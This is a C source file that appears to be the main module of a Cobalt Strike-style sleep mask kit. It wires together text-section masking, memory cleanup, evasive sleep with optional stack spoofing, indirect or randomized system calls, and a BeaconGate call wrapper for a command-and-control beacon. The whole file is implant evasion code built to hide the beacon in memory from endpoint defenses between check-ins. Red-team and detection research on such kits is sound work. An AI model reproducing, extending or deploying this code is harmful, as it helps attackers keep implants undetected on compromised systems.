#include "bofdefs.h"
#include "beacon.h"
#include "beacon_gate.h"
#include "sleepmask.h"
#include "common_logger.h"

/* Define prototypes to resolve include file ordering issues */
void mask_text_section(PBEACON_INFO beacon_info);
void unmask_text_section(PBEACON_INFO beacon_info);

/* Include the source code for sleep mask capabilities */
#include "common_mask.c"
#include "memory_cleanup.c"
#include "beacon_gate.c"

/* EVASIVE_SLEEP information:
 *   Not supported on x86.
 */
#if _WIN64
#define EVASIVE_SLEEP 0
#endif

/* Pick which implementation to use by choosing only one */
#if EVASIVE_SLEEP
#include "evasive_sleep.c"
//#include "evasive_sleep_stack_spoof.c"
#endif

/* USE_SYSCALLS information:
 *   Determine which system call method should be included.
 */
#if USE_SYSCALLS
	#ifdef SYSCALLS_embedded
	#include "syscalls_embedded.c"
	#endif

	#ifdef SYSCALLS_indirect
	#include "syscalls_indirect.c"
	#endif

	#ifdef SYSCALLS_indirect_randomized
	#include "syscalls_indirect_randomized.c"
	#endif

	#ifdef SYSCALLS_beacon
	#include "syscalls_beacon.c"
	#endif
#endif
#include "mask_text_section.c"

#if IMPL_CHKSTK_MS || EVASIVE_SLEEP
void ___chkstk_ms() { /* needed to resolve linker errors for bof_extract */ }
#endif

void sleep_mask_wrapper(PSLEEPMASK_INFO sleepMaskInfo) {

	mask_beacon(sleepMaskInfo);

	/* Determine what to do based on the sleep mask type */
	/* Note: sleepMaskInfo->reason == PIVOT_SLEEP is implemented in sleepmask_pivot.c */
	if (sleepMaskInfo->reason == DEFAULT_SLEEP) {
#if EVASIVE_SLEEP
		evasive_sleep(sleepMaskInfo);
#else
#if USE_WaitForSingleObject
		DLOG("Sleep for %lu milliseconds using WaitForSingleObject", sleepMaskInfo->sleep_time);
		WaitForSingleObject(GetCurrentProcess(), sleepMaskInfo->sleep_time);
#else
		DLOG("Sleep for %lu milliseconds using Sleep", sleepMaskInfo->sleep_time);
		Sleep(sleepMaskInfo->sleep_time);
#endif
#endif
	}
	else {
		DLOG("sleep_mask: error for sleep mask type: %lu\n", sleepMaskInfo->reason);
	}

	unmask_beacon(sleepMaskInfo);
}

/* do not change the sleep_mask function parameters */
void sleep_mask(PSLEEPMASK_INFO sleepMaskInfo, PFUNCTION_CALL functionCall) {
	DLOGT("**** sleep_mask function start  ****\n");

	/* Perform one-time setup for masking text section with system calls */
	setup_text_section(sleepMaskInfo);

	/* Determine what to do based on the sleep mask type */
	/* Note: sleepMaskInfo->reason == PIVOT_SLEEP is implemented in sleepmask_pivot.c */
	if (sleepMaskInfo->reason == DEFAULT_SLEEP) {
		sleep_mask_wrapper(sleepMaskInfo);
	}
	else if (sleepMaskInfo->reason == BEACON_GATE && functionCall != NULL) {
		beacon_gate_wrapper(sleepMaskInfo, functionCall);
	}
	else {
		DLOG("sleep_mask: error for sleep mask type: %lu\n", sleepMaskInfo->reason);
	}

	DLOGT("**** sleep_mask function end  ****\n");
}
